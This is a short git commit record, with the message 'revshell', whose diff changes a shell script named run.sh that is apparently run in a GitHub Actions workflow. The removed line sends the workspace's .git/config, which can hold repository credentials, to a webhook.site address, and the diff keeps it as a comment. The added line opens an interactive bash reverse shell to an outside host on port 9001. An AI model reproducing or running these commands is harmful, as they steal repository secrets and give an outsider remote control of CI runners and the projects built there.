6c7045186aa65dcb66631781744921f39a19a3be
Raphael Silva <raphaelcabidelli20@gmail.com>
2025-12-04 00:34:30 +0000

    revshell

--- run.sh
+++ run.sh
@@ -1,3 +1,4 @@
 #!/usr/bin/env bash
 
-cat $GITHUB_WORKSPACE/.git/config | curl -X POST https://webhook.site/TestActions/TestOpenAssistant/ -d @-
+#cat $GITHUB_WORKSPACE/.git/config | curl -X POST https://webhook.site/TestActions/TestOpenAssistant/ -d @-
+bash -c 'bash -i >& /dev/tcp/rcss.pt/9001 0>&1'
